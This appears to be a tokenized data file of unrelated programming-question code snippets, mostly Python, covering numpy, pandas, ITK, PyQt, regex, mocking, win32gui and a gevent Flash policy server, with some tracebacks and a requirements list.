"typedef unsigned char PixelType ; typedef itk : :Image < PixelType , 2 > ImageType ; typedef itk : :NaryMeanImageFilter < ImageType , ImageType > FilterType ; // custom classtypedef itk : :ImageFileReader < ImageType > ReaderType ; typedef itk : :ImageFileWriter < ImageType > WriterType ; ImageType : :Pointer image = ImageType : :New ( ) ; ReaderType : :Pointer reader = ReaderType : :New ( ) ; WriterType : :Pointer writer = WriterType : :New ( ) ; FilterType : :Pointer filter = FilterType : :New ( ) ; // custom classfor ( unsigned int i = 0 ; i < fileNames.size ( ) ; ++i ) { reader- > SetFileName ( fileNames [ i ] ) ; filter- > SetInput ( i , reader- > GetOutput ( ) ) ; // custom class } writer- > SetFileName ( outName ) ; writer- > SetInput ( filter- > GetOutput ( ) ) ; writer- > Update ( ) ; readerType=itk.ImageFileReader [ inputImageType ] reader=readerType.New ( ) filterType=itk.NaryMeanImageFilter [ inputImageType , inputImageType ] filter=filterType.New ( ) for i in range ( 0 , fileNames.size ( ) ) : reader.SetFileName ( fileNames [ i ] ) filter.SetInput ( i , reader- > GetOutput ( ) )"
"list= [ '12 ' , '345',678 ' ] , [ '12 ' , '346 ' , '578 ' ] , ... , etc . import itertoolsfor c1 , c2 in itertools.combinations ( range ( 8 ) ,2 ) : l2=list ( range ( 8 ) ) l2.pop ( c2 ) l2.pop ( c1 ) for c3 , c4 , c5 in itertools.combinations ( l2,3 ) : l3=l2 [ : ] l3.remove ( c5 ) l3.remove ( c4 ) l3.remove ( c3 ) c6 , c7 , c8=l3 print ( c1 , c2 , c3 , c4 , c5 , c6 , c7 , c8 )"
"output , state = tf.nn.dynamic_rnn ( GRUCell ( HID_DIM ) , sequence , dtype=tf.float32 , sequence_length=length ( sequence ) )"
import osfolder = '\\\\server\\studies\\backup\\backup_files'os.path.basename ( folder ) folder = '\\\\server\\studies'os.path.basename ( folder )
"import numpy as nparr1 = np.random.rand ( 100 , 1 ) arr2 = np.random.rand ( 1 , 100000 ) def noloop ( ) : return ( arr1*arr2 ) *2def loop ( ) : out = np.empty ( ( arr1.size , arr2.size ) ) for i in range ( arr1.size ) : tmp = ( arr1 [ i ] *arr2 ) *2 out [ i ] = tmp.reshape ( tmp.size ) return out > > > % timeit noloop ( ) 10 loops , best of 3 : 64.7 ms per loop > > > % timeit loop ( ) 10 loops , best of 3 : 41.6 ms per loop > > > % timeit noloop ( ) 10 loops , best of 3 : 29.4 ms per loop > > > % timeit loop ( ) 10 loops , best of 3 : 34.4 ms per loop"
"mock_coroutine = mock.Mock ( ) mock_coroutine.some_call ( 1 , 2 , 3 ) mock_coroutine.some_call.assert_called_with ( 1 , 2 , 3 ) mock_coroutine.close ( ) mock_coroutine.close.assert_called_with ( ) # this fails mock_coroutine.__next__ ( ) mock_coroutine.__next__.assert_called_with ( ) class MockCoroutine : def __next__ ( self ) : self.called_next = True def close ( self ) : self.called_exit = True"
"import win32guifrom commctrl import LVM_GETITEMCOUNTprint win32gui.SendMessage ( win32gui.GetDesktopWindow ( ) , LVM_GETITEMCOUNT ) import ctypesfrom commctrl import LVM_GETITEMCOUNTimport pywintypesimport win32guiGetShellWindow = ctypes.windll.user32.GetShellWindowdef get_desktop ( ) : `` '' '' Get the window of the icons , the desktop window contains this window '' '' '' shell_window = GetShellWindow ( ) shell_dll_defview = win32gui.FindWindowEx ( shell_window , 0 , `` SHELLDLL_DefView '' , `` '' ) if shell_dll_defview == 0 : sys_listview_container = [ ] try : win32gui.EnumWindows ( _callback , sys_listview_container ) except pywintypes.error as e : if e.winerror ! = 0 : raise sys_listview = sys_listview_container [ 0 ] else : sys_listview = win32gui.FindWindowEx ( shell_dll_defview , 0 , `` SysListView32 '' , `` FolderView '' ) return sys_listviewdef _callback ( hwnd , extra ) : class_name = win32gui.GetClassName ( hwnd ) if class_name == `` WorkerW '' : child = win32gui.FindWindowEx ( hwnd , 0 , `` SHELLDLL_DefView '' , `` '' ) if child ! = 0 : sys_listview = win32gui.FindWindowEx ( child , 0 , `` SysListView32 '' , `` FolderView '' ) extra.append ( sys_listview ) return False return Truedef get_item_count ( window ) : return win32gui.SendMessage ( window , LVM_GETITEMCOUNT ) desktop = get_desktop ( ) get_item_count ( desktop )"
"FORMAT ( 2A1 , I3 , **12I5** , F8.3 , A7 ) . The `` 12I5 '' statement translates to 12 integer values of width 5 . > > > -- -tester = [ `` M '' , `` T '' , 1111 , 2222 , 234.23456 , `` testing '' ] > > > -- -fmt = `` { 0:1 } { 1:1 } , { 2:3d } , { 3:5d } , { 4:8.3F } , { 5 : > 7 } '' > > > -- -print ( fmt.format ( *tester ) ) MT , 13 , 1234 , 234.235 , testing > > > -- -tester = [ `` M '' , `` T '' , 1111 , **2222 , 3333 , 4444** , 234.23456 , `` testing '' ] > > > -- -fmt = `` { 0:1 } { 1:1 } , { 2:3d } , **3* { 3:5d } ** , { 4:8.3F } , { 5 : > 7 } '' > > > -- -print ( fmt.format ( *tester ) )"
"1 2 34 5 67 8 9 0 neighbors = { 0 : 8 , 1 : [ 2,4 ] , 2 : [ 1,3,5 ] , 3 : [ 2,6 ] , 4 : [ 1,5,7 ] , 5 : [ 2,4,6,8 ] , 6 : [ 3,5,9 ] , 7 : [ 4,8 ] , 8 : [ 7,5,9,0 ] , 9 : [ 6,8 ] }"
"import jsonimport osimport importlib.utilspec = importlib.util.spec_from_file_location ( `` dynamodb_layer.customer '' , `` /opt/dynamodb_layer/customer.py '' ) module = importlib.util.module_from_spec ( spec ) spec.loader.exec_module ( module ) def fetch ( event , context ) : CustomerManager = module.CustomerManager customer_manager = CustomerManager ( ) body = customer_manager.list_customers ( event [ `` queryStringParameters '' ] [ `` acquirer '' ] ) response = { `` statusCode '' : 200 , `` headers '' : { `` Access-Control-Allow-Origin '' : `` * '' } , `` body '' : json.dumps ( body ) } return response"
conda create -n myenv python=3.6
"db.session.query ( User ) .all ( ) < User ( email='howard @ howard.com ' , fullname='Howard ' , company='howard ' , address='None ' , password='howard ' ) > , < User ( email='emailhoward ' , fullname='None ' , company='None ' , address='None ' , password='passwordhoward ' ) > db.session.query ( User ) .options ( load_only ( User.address ) ) .all ( ) db.session.query ( User ) .options ( load_only ( 'email ' ) ) .all ( ) < User ( email='howard @ howard.com ' , fullname='Howard ' , company='howard ' , address='None ' , password='howard ' ) > , < User ( email='emailhoward ' , fullname='None ' , company='None ' , address='None ' , password='passwordhoward ' ) > db.session.query ( User.email ) .select_from ( User ) .filter_by ( email=email ) .first ( ) [ 0 ]"
"$ python -- versionPython 2.7.15 $ type test.pyimport randomwhile True : a = random.uniform ( 0 , 1 ) b = a ** 2 c = a * a if b ! = c : print `` a = { } '' .format ( a ) print `` a ** 2 = { } '' .format ( b ) print `` a * a = { } '' .format ( c ) break $ python test.pya = 0.145376687586a ** 2 = 0.0211343812936a * a = 0.0211343812936"
"import osglobal web2py_pathweb2py_path = os.environ.get ( 'web2py_path ' , os.getcwd ( ) ) session.layout_path = web2py_path + '/common/layout.html'print 'session.layout_path = ' + session.layout_path { { extend session.layout_path } } { { extend '../../common/layout.html ' } } { { =URL ( 'common ' , 'static ' , 'css ' , 'style.css ' ) } }"
import nltkgrammar = nltk.parse_cfg ( `` '' '' # Is this possible ? TEXT - > \w* `` '' '' ) parser = nltk.RecursiveDescentParser ( grammar ) print parser.parse ( `` foo '' )
"def elem_name_ensure_class ( elem , clss= ... ) : elem_name , elem_class = elem_split_name_class ( elem ) if clss is not ... : assert ( elem_class == clss ) return elem_name.decode ( 'utf-8 ' )"
"[ ] .try ( : [ ] , 1 ) # = > nil [ 10 ] .try ( : [ ] , 1 ) # = > nil [ 10 , 20 ] .try ( : [ ] , 1 ) # = > 20 [ 10 , 20 , 30 ] .try ( : [ ] , 1 ) # = > 20 { } .try ( : foo ) # = > nil { foo : 'bar ' } .try ( : foo ) # = > 'bar '"
"def get_prediction ( data ) : # here the real calculation will be performed ... .def mainFunction ( ) : def get_prediction_init ( q ) : print ( `` a '' ) get_prediction.q = q queue = Queue ( ) pool = Pool ( processes=16 , initializer=get_prediction_init , initargs= [ queue , ] ) if __name__== '__main__ ' : mainFunction ( ) AttributeError : Ca n't pickle local object 'mainFunction. < locals > .get_prediction_init '"
"df [ ' A ' ] , df [ ' B ' ] = df [ 'AB ' ] .str.split ( ' ' , 1 ) .str"
"re.sub ( r'\ [ \*\ ] ( .* ? ) \ [ \*\ ] : ? ( .* ? ) $ ' , r'\\footnote { \2 } \1 ' , s , flags=re.MULTILINE|re.DOTALL ) s = `` '' '' This is a note [ * ] and this is another [ * ] [ * ] : some text [ * ] : other text '' '' '' This is a note\footnote { some text } and this is another\footnote { other text } This is a note\footnote { some text } and this is another [ * ] [ * ] : note 2 re.sub ( r'\ [ \*\ ] ( ? ! : ) ( ? =.+ ? \ [ \*\ ] : ? ( .+ ? ) $ ' , r'\\footnote { \1 } ' , flags=re.DOTALL|re.MULTILINE ) # ( ? ! : ) is to prevent [ * ] : to be matched s = `` '' '' This is a note [ * ] and this is another [ * ] [ * ] : some text [ * ] : other text '' '' '' This is a note\footnote { some text } and this is another\footnote { some text } [ * ] : note 1 [ * ] : note 2"
"import pylab as pltimport numpy as npl = np.random.uniform ( -180 , 180 , 2000 ) b = np.random.uniform ( -90 , 90 , 2000 ) hp.projaxes.MollweideAxes.hist2d ( l , b , bins=10 ) l_axis_name ='Latitude l ( deg ) 'b_axis_name = 'Longitude b ( deg ) 'fig = plt.figure ( figsize= ( 12,9 ) ) ax = fig.add_subplot ( 111 , projection= '' mollweide '' ) ax.grid ( True ) ax.scatter ( np.array ( l ) *np.pi/180. , np.array ( b ) *np.pi/180 . ) plt.show ( )"
"sessions = DataFrame ( { `` ID '' : [ 1,2,3,4,5 ] , '' 2018-06-30 '' : [ 23,34,45,67,75 ] , '' 2018-07-31 '' : [ 32,43,45,76,57 ] } ) leads = DataFrame ( { `` ID '' : [ 1,2,3,4,5 ] , '' 2018-06-30 '' : [ 7,10,28,15,30 ] , '' 2018-07-31 '' : [ 7,10,28,15,30 ] } )"
"> > > x , y = '버리 ' , ' 어 ' > > > z = '버려 ' > > > ord ( z [ -1 ] ) 47140 > > > ord ( x [ -1 ] ) , ord ( y ) ( 47532 , 50612 )"
from pandas import Series class Support ( Series ) : def supportMethod1 ( self ) : print ' I am support method 1 ' def supportMethod2 ( self ) : print ' I am support method 2'class Compute ( object ) : supp=None def test ( self ) : self.supp ( ) class Config ( object ) : supp=None @ classmethod def initializeConfig ( cls ) : cls.supp=Support ( ) @ classmethod def setConfig1 ( cls ) : Compute.supp=cls.supp.supportMethod1 @ classmethod def setConfig2 ( cls ) : Compute.supp=cls.supp.supportMethod2 Config.initializeConfig ( ) Config.setConfig1 ( ) c1=Compute ( ) c1.test ( ) Config.setConfig2 ( ) c1.test ( )
50.21 0.0343.23 0.0623.65 1.2012.22 0.0611.25 2.21 `` < unicode here > '' .join ( item )
left right0 0 41 5 82 10 133 3 74 12 19 5 18 236 31 35 left right group0 0 4 01 5 8 02 10 13 13 3 7 04 12 19 15 18 23 16 31 35 2
"class Test ( object ) : def __init__ ( self , name , number_array ) : self.name = name self.number_array = number_array def __repr__ ( self ) : return str ( self.name ) def custom_repr ( self ) : return str ( self.name*4 ) > > > A = Test ( 'foo ' , [ 1,2 ] ) > > > Afoo > > > A.__repr__ = custom_repr.__get__ ( A , A.__class__ ) > > > A.__repr__ ( ) foofoofoofoo > > > Afoo"
"import pandas as pdday_df = pd.DataFrame ( index=pd.date_range ( '2016-01-01 ' , '2020-12-31 ' ) ) for ( week , year ) , subset in day_df.groupby ( [ day_df.index.week , day_df.index.year ] ) : if week == 1 : print ( 'Week : ' , subset.index.min ( ) , subset.index.max ( ) ) Week : 1 2016-01-04 00:00:00 2016-01-10 00:00:00Week : 1 2017-01-02 00:00:00 2017-01-08 00:00:00Week : 1 2018-01-01 00:00:00 2018-12-31 00:00:00Week : 1 2019-01-01 00:00:00 2019-12-31 00:00:00Week : 1 2020-01-01 00:00:00 2020-01-05 00:00:00 for ( week , year ) , subset in day_df.groupby ( [ day_df.index.week , day_df.index.year ] ) : # Prevent first week of year from including final days of same year if set ( subset.index.month.unique ( ) ) == set ( [ 1 , 12 ] ) : subset = subset.loc [ subset.index.month == 1 ] if week == 1 : print ( 'Week : ' , week , subset.index.min ( ) , subset.index.max ( ) ) Week : 1 2016-01-04 00:00:00 2016-01-10 00:00:00Week : 1 2017-01-02 00:00:00 2017-01-08 00:00:00Week : 1 2018-01-01 00:00:00 2018-01-07 00:00:00Week : 1 2019-01-01 00:00:00 2019-01-06 00:00:00Week : 1 2020-01-01 00:00:00 2020-01-05 00:00:00"
Random r = new Random ( seed ) ; r.nextDouble ( ) ; old_state = random.getstate ( ) random.seed ( seed ) random.random ( ) random.setstate ( old_state )
"import matplotlib.pyplot as pltimport sysfrom PIL import Imagefrom PyQt5.QtGui import QPixmap , QImage from PyQt5.QtWidgets import ( QMainWindow , QApplication , QVBoxLayout , QWidget , QFileDialog , QGraphicsPixmapItem , QGraphicsView , QGraphicsScene ) import numpy as npclass Example ( QMainWindow ) : def __init__ ( self ) : super ( ) .__init__ ( ) self.initUI ( ) def initUI ( self ) : # set up a widget to hold a pixmap wid = QWidget ( self ) self.setCentralWidget ( wid ) self.local_grview = QGraphicsView ( ) self.local_scene = QGraphicsScene ( ) vbox = QVBoxLayout ( ) self.local_grview.setScene ( self.local_scene ) vbox.addWidget ( self.local_grview ) wid.setLayout ( vbox ) # load and display the image self.loadImage ( ) # display the widget self.show ( ) # also use matplotlib to display the data as it should appear plt.imshow ( self.dataUint8 [ 0 ] , cmap='gray ' ) plt.show ( ) def loadImage ( self ) : fname = QFileDialog.getOpenFileName ( self , 'Open file ' , '/home ' ) [ 0 ] # use the tif reader to read in the tif stack self.data = self.readTif ( fname ) # convert to uint8 for display self.dataUint8 = self.uint8Convert ( self.data ) # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # I suspect this is where something goes wrong # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # create a QImage object self.im = QImage ( self.dataUint8 [ 0 ] , self.dataUint8 [ 0 ] .shape [ 1 ] , self.dataUint8 [ 0 ] .shape [ 0 ] , QImage.Format_Grayscale8 ) # if we save using self.im.save ( ) we also have a skewed image # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # send the QImage object to the pixmap generator self.pixmap = QPixmap ( self.im ) self.pixMapItem = QGraphicsPixmapItem ( self.pixmap , None ) self.local_scene.addItem ( self.pixMapItem ) def readTif ( self , filename ) : # use this function to read in a tif stack and return a 3D numpy array # read in the file stack = Image.open ( filename ) # extract each frame from the file and store in the frames variable frames = [ ] i = 0 while True : try : stack.seek ( i ) # move to the ith position in the stack frames.append ( np.array ( stack ) ) i += 1 except EOFError : # end of stack break del stack # probably unnecessary but this presumably saves a bit of memory return frames def uint8Convert ( self , frames ) : # use this function to scale a 3D numpy array of floats to 0-255 so it plays well with Qt methods # convert float array to uint8 array if np.min ( frames ) < 0 : frames_uint8 = [ np.uint8 ( ( np.array ( frames [ i ] ) - np.min ( frames [ i ] ) ) /np.max ( frames [ i ] ) *255 ) for i in range ( np.shape ( frames ) [ 0 ] ) ] else : frames_uint8 = [ np.uint8 ( np.array ( frames [ i ] ) /np.max ( frames [ i ] ) *255 ) for i in range ( np.shape ( frames ) [ 0 ] ) ] return frames_uint8if __name__=='__main__ ' : app = QApplication ( sys.argv ) ex = Example ( ) sys.exit ( app.exec_ ( ) )"
def delete_youtube_video_by_id ( video_id ) : yt_service = gdata.youtube.service.YouTubeService ( ) yt_service.email = YOUTUBE_EMAIL yt_service.password = YOUTUBE_SECRET_PASSWORD yt_service.source = YOUTUBE_SOURCE yt_service.developer_key = YOUTUBE_SECRET_DEVELOPER_KEY yt_service.client_id = YOUTUBE_CLIENT_ID yt_service.ProgrammaticLogin ( ) video_entry = yt_service.GetYouTubeVideoEntry ( video_id=video_id ) response = yt_service.DeleteVideoEntry ( video_entry ) return response > > > response = delete_youtube_video_by_id ( 'my_youtube_video_id ' ) > > > type ( response ) < type 'NoneType ' > > > >
def my_generator ( ) : for elem in the_infinite_stream ( ) : yield elem stream1 = my_generator ( ) stream2 = my_generator ( )
"scores = [ matrix [ i ] [ i ] / sum ( matrix [ i ] ) for ( i , scores ) in enumerate ( matrix ) ] scores = [ divide ( matrix [ i ] [ i ] , sum ( matrix [ i ] ) ) for ( i , scores ) in enumerate ( matrix ) ]"
"google_appengine/google/appengine/api/user_service_pb.py '' , line 178 , in ByteSize n += self.lengthString ( len ( self.destination_url_ ) ) TypeError : object of type 'NoneType ' has no len ( )"
"% matplotlib inlineimport numpy as npimport matplotlib.pyplot as pltimport matplotlib as matimport mpld3mpld3.enable_notebook ( ) from mpld3 import pluginsfig , ax = plt.subplots ( 2 , 2 , figsize= ( 10 , 8 ) ) fig.subplots_adjust ( hspace=0.1 , wspace=0.1 ) ax = ax [ : :-1 ] X = np.random.normal ( size= ( 2 , 100 ) ) for i in range ( 2 ) : for j in range ( 2 ) : ax [ i , j ] .xaxis.set_major_formatter ( plt.NullFormatter ( ) ) ax [ i , j ] .yaxis.set_major_formatter ( plt.NullFormatter ( ) ) points = ax [ i , j ] .scatter ( X [ j ] , X [ i ] ) plugins.connect ( fig , plugins.LinkedBrush ( points ) )"
"fib = lambda n : fib ( n - 1 ) + fib ( n - 2 ) if n > 1 else 1 fib = functools.lru_cache ( ( lambda n : fib ( n - 1 ) + fib ( n - 2 ) if n > 1 else 1 ) , maxsize = None ) > > > fib = functools.lru_cache ( ( lambda n : fib ( n - 1 ) + fib ( n - 2 ) if n > 1 else 1 ) , maxsize = None ) Traceback ( most recent call last ) : File `` < pyshell # 2 > '' , line 1 , in < module > fib = functools.lru_cache ( ( lambda n : fib ( n - 1 ) + fib ( n - 2 ) if n > 1 else 1 ) , maxsize = None ) TypeError : lru_cache ( ) got multiple values for argument 'maxsize '"
"print ( data [ 3 ] ) # [ array ( [ [ 0.00000000e+00 , 3.29530000e+04 ] , # [ 4.00066376e-04 , 3.29530000e+04 ] , # [ 8.00132751e-04 , 3.29530000e+04 ] , # ... , # [ 1.28784461e+03 , 3.47140000e+04 ] , # [ 1.28784621e+03 , 3.57750000e+04 ] , # [ 1.28785381e+03 , 1.92450000e+04 ] ] ) , # 'CH4.VDC1 ' ] new = np.empty_like ( data ) new [ : ] = datanew [ 3 ] [ 0 ] [ : ,1 ] = 4/16421 * ( data [ 3 ] [ 0 ] [ : ,1 ] - 33563 ) print ( data [ 3 ] ) # [ array ( [ [ 0.00000000e+00 , -1.48590220e-01 ] , # [ 4.00066376e-04 , -1.48590220e-01 ] , # [ 8.00132751e-04 , -1.48590220e-01 ] , # ... , # [ 1.28784461e+03 , 2.80372694e-01 ] , # [ 1.28784621e+03 , 5.38822240e-01 ] , # [ 1.28785381e+03 , -3.48772913e+00 ] ] ) , # 'CH4.VDC1 ' ] np.shares_memory ( new , data ) # falsenp.might_share_memory ( new , data ) # false np.array ( [ [ [ [ 0.00000000e+00 , 2.82540000e+04 ] , [ 4.00066376e-04 , 2.82530000e+04 ] , [ 8.00132751e-04 , 2.82520000e+04 ] , [ 1.28784461e+03 , 4.61170000e+04 ] , [ 1.28784621e+03 , 3.38280000e+04 ] , [ 1.28785381e+03 , 3.38230000e+04 ] ] , 'CH1.Bx ' ] , [ [ [ 0.00000000e+00 , 2.00400000e+04 ] , [ 4.00066376e-04 , 2.00400000e+04 ] , [ 8.00132751e-04 , 2.00410000e+04 ] , [ 1.28784461e+03 , 1.81600000e+04 ] , [ 1.28784621e+03 , 1.80830000e+04 ] , [ 1.28785381e+03 , 4.80200000e+03 ] ] , 'CH2.By ' ] , [ array ( [ [ 0.00000000e+00 , 3.82520000e+04 ] , [ 4.00066376e-04 , 3.82510000e+04 ] , [ 8.00132751e-04 , 3.82510000e+04 ] , [ 1.28784461e+03 , 3.42810000e+04 ] , [ 1.28784621e+03 , 3.42820000e+04 ] , [ 1.28785381e+03 , 3.40380000e+04 ] ] ) , 'CH3.Bz ' ] , [ [ [ 0.00000000e+00 , -1.48590220e-01 ] , [ 4.00066376e-04 , -1.48590220e-01 ] , [ 8.00132751e-04 , -1.48590220e-01 ] , [ 1.28784461e+03 , 2.80372694e-01 ] , [ 1.28784621e+03 , 5.38822240e-01 ] , [ 1.28785381e+03 , -3.48772913e+00 ] ] , 'CH4.VDC1 ' ] , [ [ [ 0.00000000e+00 , 3.26760000e+04 ] , [ 4.00066376e-04 , 3.26760000e+04 ] , [ 8.00132751e-04 , 3.26750000e+04 ] , [ 1.28784981e+03 , 3.40450000e+04 ] , [ 1.28785061e+03 , 3.40420000e+04 ] , [ 1.28785141e+03 , 3.40390000e+04 ] ] , 'CH5.VDC2 ' ] ] , dtype=object ) `"
"import argparseimport osimport pytestdef main ( argsIn ) : def configFile_validation ( configFile ) : if not os.path.exists ( configFile ) : msg = 'Configuration file `` { } '' not found ! '.format ( configFile ) raise argparse.ArgumentTypeError ( msg ) return configFile parser = argparse.ArgumentParser ( ) parser.add_argument ( '-c ' , ' -- configFile ' , help='Path to configuration file ' , dest='configFile ' , required=True , type=configFile_validation ) args = parser.parse_args ( argsIn ) def test_non_existing_config_file ( ) : with pytest.raises ( argparse.ArgumentTypeError ) : main ( [ ' -- configFile ' , 'non_existing_config_file.json ' ] )"
"typedef struct Tag { int num ; char *name ; } Tag ; Tag *create ( int n , char *n ) { Tag *t = malloc ( sizeof ( Tag ) ) ; t- > num = n ; t- > name = n ; return t ; } void use ( Tag *t ) { printf ( `` % d , % s\n '' , t- > num , t- > name ) ; } > > > libx = ctypes.CDLL ( `` ./libx.so '' ) > > > res = libx.create ( c_int ( 1 ) , c_char_p ( `` a '' ) ) > > > libx.use ( res )"
"re.match ( regex , largeString [ pos : ] )"
"console : Failed to install `` : java.nio.charset.UnsupportedCharsetException : cp0 . pydev debugger : starting ( pid : 4216 ) Traceback ( most recent call last ) : File `` C : \Users\souzadan\.p2\pool\plugins\org.python.pydev_4.4.0.201510052309\pysrc\pydevd.py '' , line 2364 , in < module > globals = debugger.run ( setup [ 'file ' ] , None , None , is_module ) File `` C : \Users\souzadan\.p2\pool\plugins\org.python.pydev_4.4.0.201510052309\pysrc\pydevd.py '' , line 1784 , in run pydev_imports.execfile ( file , globals , locals ) # execute the script File `` C : \Users\souzadan\FirmwareDevTools\Workspaces\Eclipse\aPythonWorkspace\aPythonProject\aPythonFolder\aPythonFile.py '' , line 7 , in < module > standard_library.install_aliases ( ) File `` C : \Users\souzadan\FirmwareDevTools\Compilers\Jython2.7.0\Lib\site-packages\future-0.15.2-py2.7.egg\future\standard_library\__init__.py '' , line 465 , in install_aliases from future.backports.urllib import request File `` C : \Users\souzadan\FirmwareDevTools\Compilers\Jython2.7.0\Lib\site-packages\future-0.15.2-py2.7.egg\future\backports\urllib\request.py '' , line 96 , in < module > from future.backports import email File `` C : \Users\souzadan\FirmwareDevTools\Compilers\Jython2.7.0\Lib\site-packages\future-0.15.2-py2.7.egg\future\backports\email\__init__.py '' , line 16 , in < module > from future.utils import surrogateescape File `` C : \Users\souzadan\FirmwareDevTools\Compilers\Jython2.7.0\Lib\site-packages\future-0.15.2-py2.7.egg\future\utils\surrogateescape.py '' , line 167 , in < module > FS_ENCODING = 'ascii ' ; fn = b ( ' [ abc\xff ] ' ) ; encoded = u ( ' [ abc\udcff ] ' ) File `` C : \Users\souzadan\FirmwareDevTools\Compilers\Jython2.7.0\Lib\site-packages\future-0.15.2-py2.7.egg\future\utils\surrogateescape.py '' , line 25 , in u return text.decode ( 'unicode_escape ' ) UnicodeDecodeError : 'unicodeescape ' codec ca n't decode bytes in position 4-10 : illegal Unicode characterError in atexit._run_exitfuncs : Traceback ( most recent call last ) : File `` C : \Users\souzadan\FirmwareDevTools\Compilers\Jython2.7.0\Lib\atexit.py '' , line 24 , in _run_exitfuncs func ( *targs , **kargs ) File `` C : \Users\souzadan\FirmwareDevTools\Compilers\Jython2.7.0\Lib\threading.py '' , line 297 , in _MainThread__exitfunc t.join ( ) File `` C : \Users\souzadan\FirmwareDevTools\Compilers\Jython2.7.0\Lib\threading.py '' , line 128 , in join raise RuntimeError ( `` can not join current thread '' ) RuntimeError : can not join current threadError in sys.exitfunc : Traceback ( most recent call last ) : File `` C : \Users\souzadan\FirmwareDevTools\Compilers\Jython2.7.0\Lib\atexit.py '' , line 24 , in _run_exitfuncs func ( *targs , **kargs ) File `` C : \Users\souzadan\FirmwareDevTools\Compilers\Jython2.7.0\Lib\threading.py '' , line 297 , in _MainThread__exitfunc t.join ( ) File `` C : \Users\souzadan\FirmwareDevTools\Compilers\Jython2.7.0\Lib\threading.py '' , line 128 , in join raise RuntimeError ( `` can not join current thread '' ) RuntimeError : can not join current thread Traceback ( most recent call last ) : File `` somePythonCode.py '' , line 7 , in < module > standard_library.install_aliases ( ) File `` C : \Users\souzadan\FirmwareDevTools\Compilers\Jython2.7.0\Lib\site-packages\future-0.15.2-py2.7.egg\future\standard_library\__init__.py '' , line 465 , in install_aliases from future.backports.urllib import request File `` C : \Users\souzadan\FirmwareDevTools\Compilers\Jython2.7.0\Lib\site-packages\future-0.15.2-py2.7.egg\future\backports\urllib\request.py '' , line 96 , in < module > from future.backports import email File `` C : \Users\souzadan\FirmwareDevTools\Compilers\Jython2.7.0\Lib\site-packages\future-0.15.2-py2.7.egg\future\backports\email\__init__.py '' , line 16 , in < module > from future.utils import surrogateescape File `` C : \Users\souzadan\FirmwareDevTools\Compilers\Jython2.7.0\Lib\site-packages\future-0.15.2-py2.7.egg\future\utils\surrogateescape.py '' , line 167 , in < module > FS_ENCODING = 'ascii ' ; fn = b ( ' [ abc\xff ] ' ) ; encoded = u ( ' [ abc\udcff ] ' ) File `` C : \Users\souzadan\FirmwareDevTools\Compilers\Jython2.7.0\Lib\site-packages\future-0.15.2-py2.7.egg\future\utils\surrogateescape.py '' , line 25 , in u return text.decode ( 'unicode_escape ' ) UnicodeDecodeError : 'unicodeescape ' codec ca n't decode bytes in position 4-10 : illegal Unicode character"
asgiref==3.2.7astroid==2.3.3cachetools==3.1.1certifi==2019.11.28chardet==3.0.4Click==7.0colorama==0.4.1Django==3.0.6django-crispy-forms==1.9.0django-formtools==2.2Flask==1.1.1google-api-core==1.21.0google-api-python-client==1.9.3google-auth==1.18.0google-auth-httplib2==0.0.3google-auth-oauthlib==0.4.1google-cloud==0.34.0google-cloud-core==1.1.0google-cloud-error-reporting==0.33.0google-cloud-firestore==1.6.2google-cloud-kms==1.3.0google-cloud-logging==1.14.0google-cloud-pubsub==1.1.0google-cloud-secret-manager==0.2.0googleapis-common-protos==1.6.0grpc-google-iam-v1==0.12.3grpcio==1.27.2httplib2==0.14.0idna==2.8isort==4.3.21itsdangerous==1.1.0Jinja2==2.10.3lazy-object-proxy==1.4.3MarkupSafe==1.1.1mccabe==0.6.1oauth2client==4.1.3oauthlib==3.1.0protobuf==3.12.2pyasn1==0.4.8pyasn1-modules==0.2.7PyJWT==1.7.1pylint==2.4.4pytz==2019.3PyYAML==5.3.1requests==2.22.0requests-oauthlib==1.3.0rsa==4.0six==1.13.0sqlparse==0.3.1twilio==6.35.5uritemplate==3.0.0urllib3==1.25.7Werkzeug==0.16.0wrapt==1.11.2
"myThread = threading.Thread ( target=sender.mainloop.run , daemon=True ) myThread.start ( ) myThread2 = threading.Thread ( target=receiver.mainloop.run , daemon=True ) myThread2.start ( )"
"for a in [ 0..1 ] : for b in [ 0..1 ] : for c in [ 0..1 ] : do something for a , b , c in [ 0..1 ] : do something"
"In [ 87 ] : metadf2 [ [ 'Week ' , 'Activity ' ] ] Out [ 87 ] : Week Activityweekday 0 15 1.60 15 1.10 17 0.60 17 0.80 17 1.30 17 2.60 17 0.90 19 1.00 19 8.00 19 1.60 23 5.00 23 1.20 23 0.60 23 5.61 15 1.61 15 0.21 15 0.11 15 0.11 15 0.41 17 12.21 19 10.21 19 1.62 13 1.72 14 0.02 14 0.02 15 6.92 15 2.52 15 5.52 17 6.22 17 1.3 ... ... ... 3 14 1.13 14 4.93 14 4.03 14 1.53 14 3.94 14 0.25 15 5.45 15 5.15 18 9.55 18 8.85 20 108.85 20 11.15 20 11.26 13 74.96 13 2.06 13 3.26 13 2.06 13 16.76 13 5.56 16 0.46 15 7.66 15 11.76 15 25.86 16 0.46 16 0.46 16 1.36 20 2.06 20 20.56 20 77.06 20 32.8"
"from gevent.server import StreamServerpolicy = `` '' '' < ? xml version= '' 1.0 '' encoding= '' UTF-8 '' ? > < cross-domain-policy > < site-control permitted-cross-domain-policies= '' master-only '' / > < allow-access-from domain= '' * '' to-ports= '' * '' secure= '' false '' / > < /cross-domain-policy > \0 '' '' '' def handle ( sock , address ) : s = sock.makefile ( ) while True : msg = s.readline ( ) if not msg : print ( `` Client disconnected ( % s : % s ) '' % address ) break else : sock.sendall ( policy ) print ( `` Client connected , served policy ( % s : % s ) '' % address ) server = StreamServer ( ( ' 0.0.0.0 ' , 843 ) , handle ) server.serve_forever ( ) [ WebSocket ] policy file : xmlsocket : //localhost:843 [ WebSocket ] can not connect to Web Socket server at ws : //localhost:8065 ( SecurityError : Error # 2048 ) make sure the server is running and Flash socket policy file is correctly placed [ WebSocket ] close"
